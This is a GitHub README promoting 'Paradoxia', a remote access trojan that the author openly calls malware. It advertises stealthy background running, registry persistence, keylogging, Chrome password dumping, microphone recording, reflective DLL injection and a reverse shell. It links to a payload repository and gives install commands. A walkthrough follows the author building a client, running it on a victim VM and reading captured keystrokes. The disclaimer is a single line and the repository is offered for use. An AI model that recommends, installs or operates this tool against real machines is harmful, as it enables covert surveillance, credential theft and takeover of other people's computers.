<html>
  <img src="https://github.com/quantumcored/paradoxia/blob/master/images/logo.png" height="90px" widgh = "90px">
  </html>
Paradoxia Remote Access Tool.

**Are you looking for a GUI alternative? Check out [Remote Hacker Probe](https://github.com/quantumcored/remote_hacker_probe). More Advanced and Stable with ton of features.**

### Features 

##### Paradoxia Console
Feature | Description
--------|-------------
Easy to use | Paradoxia is extremely easy to use, So far the easiest rat!
Root Shell | -
Automatic Client build | Build Paradoxia Client easily with or without the icon of your choice.
Multithreaded | Multithreaded Console server, You can get multiple sessions.
Toast Notifications | Desktop notification on new session
Configurable Settings | Configurable values in ``paradoxia.ini``
Kill Sessions | Kill Sessions without getting in session.
View Session information | View Session information without getting in Session.

---

##### Paradoxia Client
Feature | Description
--------|-------------
Stealth | Runs in background.
Full File Access | Full access to the entire file system.
Persistence | Installs inside APPDATA and has startup persistence via Registry key.
Upload / Download Files | Upload and download files.
Screenshot | Take screenshot.
Mic Recording | Record Microphone.
Chrome Password Recovery | Dump Chrome Passwords using Reflective DLL (Does not work on latest version) :shipit:
Keylogger | Log Keystrokes and save to file via Reflective DLL.
Geolocate | Geolocate Paradoxia Client.
Process Info | Get Process information.
DLL Injection | Reflective DLL Injection over Socket, Load your own Reflective DLL, OR use ones available [here](https://github.com/quantumcored/maalik/tree/master/payloads).
Power off | Power off the Client system.
Reboot | Reboot the client system.
MSVC + MINGW Support | Visual studio project is also included.
Reverse Shell | Stable Reverse Shell.
Small Client | Maximum size is 30kb without icon.

---


### Installation (via APT)
```bash
$ git clone https://github.com/quantumcored/paradoxiaRAT
$ cd paradoxiaRAT
$ chmod +x install.sh
$ sudo ./install.sh
```

### Example Usage :
- Run Paradoxia
```
sudo python3 paradoxia.py
```
- Once in paradoxia Console, The first step would be to build the Client, Preferably with an Icon. 

![pd1](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd1.PNG)

- After that's built, As you can see below it is detected by Windows Defender as a severe malware. Which is expected since it IS malware.

![pd2](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd2.PNG)

- I'm going to transfer the client on a Windows 10 Virtual machine and execute it. After Executing it, It appears under Startup programs in task manager. 

![pd3](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd3.PNG)

- Also it has copied itself inside Appdata directory and installed under the name we specified during build.

![pdmiss](https://github.com/quantumcored/paradoxiaRAT/blob/master/images/pdmiss.PNG)

- At the same time, I get a session at server side.

![pd4](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd4.PNG)

- First thing I'd do is get in the session and view information.

![pd5](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd5.PNG)

- There are plenty of things we can do right now, but for example only, I will demonstrate keylogging.

![pd6](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd7.PNG)

You can see in the image above that It says it successfully injected dll, And in file listing there is a file named ``log.log``, Which contains the logged keystrokes.

- Lets view captured keystrokes.

![pd7](https://github.com/quantumcored/paradoxiaRAT/raw/master/images/pd8.PNG)


### Changelogs
- This repository was home to 3 tools previously, [Iris](https://github.com/quantumcored/iris), [Thawne](https://github.com/quantumcored/thawne) and Previous version of Paradoxia. This can be found [here](https://github.com/quantumcored/paradoxiaRAT/tree/930a396cb64744de0d8cd14e55540a97ba9fa452).
- Everything is entirely changed, Client has been rewritten, Infodb removed. Much new features added. Stability added.

#### Links
- [Setting up Paradoxia on Kali Linux](https://youtu.be/F4TAdWDlR-w) (Old Version, but works)

#### Developer
Hi my name's [Fahad](https://github.com/quantumcore).
You may contact me, on [Discord](https://discordapp.com/invite/8snh7nx) or [My Website](https://quantumcored.com/)

#### LICENSE
[VIEW LICENSE](https://github.com/quantumcored/paradoxia/blob/master/LICENSE) 

The Developer is not responsible for any misuse of Damage caused by the program. This is created only to innovate InfoSec and **YOU**. :point_left:

#### Donate
Help me with my future projects. Thank you.
[Donate with Crypto](https://commerce.coinbase.com/checkout/cebcb394-f73e-4990-98b9-b3fdd852358f)
